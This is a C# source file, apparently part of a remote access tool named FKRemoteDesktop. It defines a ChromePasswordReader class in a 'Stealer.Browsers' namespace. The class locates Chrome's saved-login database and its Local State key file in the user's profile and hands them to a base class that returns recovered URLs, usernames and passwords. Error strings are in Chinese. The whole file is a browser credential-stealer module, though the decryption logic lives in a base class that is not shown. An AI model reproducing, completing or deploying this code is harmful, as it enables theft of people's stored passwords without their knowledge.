using FKRemoteDesktop.Message.MessageStructs;
using System;
using System.Collections.Generic;
using System.IO;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Browsers
{
    public class ChromePasswordReader : ChromiumBase
    {
        public override string ApplicationName => "Chrome 浏览器";
        public override string KeyName => "Password";

        public override IEnumerable<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Default\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception ex)
            {
                List<RecoveredAccount> l = new List<RecoveredAccount>();
                l.Add(new RecoveredAccount
                {
                    KeyName = KeyName,
                    Url = "访问出错: " + ex.Message,
                    Username = "N/A",
                    Password = "N/A",
                    Application = ApplicationName
                });
                return l;
            }
        }
    }
}